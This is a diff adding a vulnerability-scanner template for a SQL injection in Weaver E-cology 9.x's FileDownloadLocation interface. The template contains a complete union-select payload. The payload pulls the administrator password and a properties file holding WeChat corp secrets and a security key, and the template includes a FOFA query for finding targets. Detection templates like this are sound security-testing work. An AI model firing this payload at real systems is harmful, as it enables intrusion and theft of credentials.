@@ -1,0 +1,27 @@
+id: weaver-ecology9-filedownloadlocation-sqli
+info:
+  name: Weaver E-cology 9.x FileDownloadLocation SQL Injection
+  author: ZacharyZcR
+  severity: critical
+  verified: true
+  description: |
+    Weaver E-cology 9.x FileDownloadLocation interface has a SQL injection vulnerability.
+    The vulnerability exists in the mailId parameter which allows an attacker to execute arbitrary SQL queries.
+    FOFA: body="doCheckPopupBlocked"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEe-cology9%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3FileDownloadLocation%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: weaver,ecology,sqli
+  created: 2024/12/30
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,'../ecology/WEB-INF/prop/mobilemode.properties'+as+x2,'3'+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&mailid=action.WorkflowFnaEffectNew&parentid=0
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'wx.enabled') &&
+      response.body.bcontains(b'wx.corpid') &&
+      response.body.bcontains(b'wx.corpsecret') &&
+      response.body.bcontains(b'security.key')
+expression: r0()
